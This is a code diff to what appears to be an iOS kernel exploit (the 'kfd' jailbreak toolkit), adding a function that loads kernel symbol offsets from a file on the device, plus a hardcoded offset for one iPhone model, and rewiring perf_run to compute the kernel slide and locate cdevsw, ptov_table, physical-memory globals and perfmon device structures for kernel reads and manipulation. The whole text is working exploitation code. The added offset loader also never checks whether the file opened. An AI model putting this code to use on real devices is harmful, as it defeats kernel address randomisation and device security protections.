@@ -83,6 +83,38 @@ void perf_init(struct kfd* kfd)
     assert(kfd->perf.dev.fd > 0);
 }
 
+bool isarm64e(void) {
+    int ptrAuthVal = 0;
+    size_t len = sizeof(ptrAuthVal);
+    assert(sysctlbyname("hw.optional.arm.FEAT_PAuth", &ptrAuthVal, &len, NULL, 0) != -1);
+    if(ptrAuthVal != 0)
+        return true;
+    return false;
+}
+
+uint64_t get_address(char* name) {
+    if (!name) {
+        return 0;
+    }
+    if (!strcmp(name, "vn_kqfilter")) {
+        if (!isarm64e()) {
+            printf("FIXME: returning hardcoded offset for iPhone X, 16.6.1.\n");
+            return 0xfffffff00736c5f4;
+        }
+    }
+    FILE* fp = fopen("/var/mobile/offsets.txt", "r");
+    char line[256];
+    while (fgets(line, sizeof(line), fp)) {
+        char* p = strstr(line, name);
+        if (p) {
+            uint64_t addr = strtoull(p + strlen(name) + 2, NULL, 16);
+            fclose(fp);
+            return addr;
+        }
+    }
+    return 0;
+}
+
 void perf_run(struct kfd* kfd)
 {
     assert(kfd->info.kaddr.current_proc);
@@ -96,8 +128,8 @@ void perf_run(struct kfd* kfd)
     u64 fg_ops = kget_u64(fileglob__fg_ops, unsign_kaddr(fp_glob));
     u64 fo_kqfilter =  kget_u64(fileops__fo_kqfilter, unsign_kaddr(fg_ops));
     u64 vn_kqfilter = unsign_kaddr(fo_kqfilter);
-    u64 kernel_slide = vn_kqfilter - kfd_offset(kernelcache__vn_kqfilter);
-    u64 kernel_base = kfd_offset(kernelcache__kernel_base) + kernel_slide;
+    u64 kernel_slide = vn_kqfilter - get_address("vn_kqfilter");
+    u64 kernel_base = get_address("base") + kernel_slide;
     kfd->perf.kernel_slide = kernel_slide;
     print_x64(kfd->perf.kernel_slide);
 
@@ -117,8 +149,8 @@ void perf_run(struct kfd* kfd)
     kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + kfd_offset(specinfo__si_rdev);
     kread((u64)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));
 
-    u64 cdevsw_kaddr = kfd_offset(kernelcache__cdevsw) + kernel_slide;
-    u64 perfmon_dev_open_kaddr = kfd_offset(kernelcache__perfmon_dev_open) + kernel_slide;
+    u64 cdevsw_kaddr = get_address("cdevsw") + kernel_slide;
+    u64 perfmon_dev_open_kaddr = get_address("perfmon_dev_open") + kernel_slide;
     u64 cdevsw[14] = {};
     u32 dev_new_major = 0;
     for (u64 dmaj = 0; dmaj < 64; dmaj++) {
@@ -139,18 +171,18 @@ void perf_run(struct kfd* kfd)
     /*
      * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
      */
-    u64 ptov_table_kaddr = kfd_offset(kernelcache__ptov_table) + kernel_slide;
+    u64 ptov_table_kaddr = get_address("ptov_table") + kernel_slide;
     kread((u64)(kfd), ptov_table_kaddr, &kfd->perf.ptov_table, sizeof(kfd->perf.ptov_table));
 
-    u64 gVirtBase_kaddr = kfd_offset(kernelcache__gVirtBase) + kernel_slide;
+    u64 gVirtBase_kaddr = get_address("gVirtBase") + kernel_slide;
     kread((u64)(kfd), gVirtBase_kaddr, &kfd->perf.gVirtBase, sizeof(kfd->perf.gVirtBase));
     print_x64(kfd->perf.gVirtBase);
 
-    u64 gPhysBase_kaddr = kfd_offset(kernelcache__gPhysBase) + kernel_slide;
+    u64 gPhysBase_kaddr = get_address("gPhysBase") + kernel_slide;
     kread((u64)(kfd), gPhysBase_kaddr, &kfd->perf.gPhysBase, sizeof(kfd->perf.gPhysBase));
     print_x64(kfd->perf.gPhysBase);
 
-    u64 gPhysSize_kaddr = kfd_offset(kernelcache__gPhysSize) + kernel_slide;
+    u64 gPhysSize_kaddr = get_address("gPhysSize") + kernel_slide;
     kread((u64)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
     print_x64(kfd->perf.gPhysSize);
 
@@ -176,7 +208,7 @@ void perf_run(struct kfd* kfd)
      * - perfmon_devices[0][0].pmdv_allocated = true
      */
     struct perfmon_device perfmon_device = {};
-    u64 perfmon_device_kaddr = kfd_offset(kernelcache__perfmon_devices) + kernel_slide;
+    u64 perfmon_device_kaddr = get_address("perfmon_devices") + kernel_slide;
     u8* perfmon_device_uaddr = (u8*)(&perfmon_device);
     kread((u64)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));
 
